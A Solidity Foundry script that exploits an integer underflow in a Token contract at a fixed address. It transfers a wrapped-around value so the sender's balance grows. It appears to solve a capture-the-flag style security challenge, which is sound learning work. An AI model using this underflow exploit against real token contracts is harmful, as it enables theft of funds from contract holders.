// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Token} from "../src/token/Token.sol";

contract TokenScript is Script {
    Token token;
    address user;
    uint256 userPrivateKey;

    function setUp() public {
        token = Token(0xe0e1427cB8A78d6a13106Ad538f3Ea855F7662dE);
        userPrivateKey = vm.envUint("PRIVATE_KEY");
        user = vm.addr(userPrivateKey);
    }

    function run() public {
        uint256 initialBalance = token.balanceOf(user);
        require(initialBalance > 0, "User has no tokens");

        uint256 max = type(uint256).max;
        uint256 transferValue = max + initialBalance + 2;

        vm.startBroadcast(userPrivateKey);
        token.transfer(address(0), transferValue);

        uint256 finalBalance = token.balanceOf(user);

        require(finalBalance > initialBalance, "failed to transfer");
    }
}
